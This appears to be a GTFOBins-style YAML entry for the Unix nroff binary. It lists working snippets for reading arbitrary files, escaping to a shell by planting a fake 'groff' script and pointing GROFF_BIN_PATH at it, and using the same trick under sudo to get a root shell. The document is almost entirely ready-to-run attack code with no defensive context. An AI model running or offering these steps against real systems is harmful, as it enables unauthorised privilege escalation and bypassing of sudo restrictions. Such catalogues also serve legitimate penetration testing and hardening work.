---
functions:
  file-read:
    - description: The read file content is corrupted by arbitrary newlines.
      code: |
        LFILE=file_to_read
        nroff $LFILE
  shell:
    - code: |
        TF=$(mktemp -d)
        echo '#!/bin/sh' > $TF/groff
        echo '/bin/sh' >> $TF/groff
        chmod +x $TF/groff
        GROFF_BIN_PATH=$TF nroff
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo '#!/bin/sh' > $TF/groff
        echo '/bin/sh' >> $TF/groff
        chmod +x $TF/groff
        sudo GROFF_BIN_PATH=$TF nroff
---
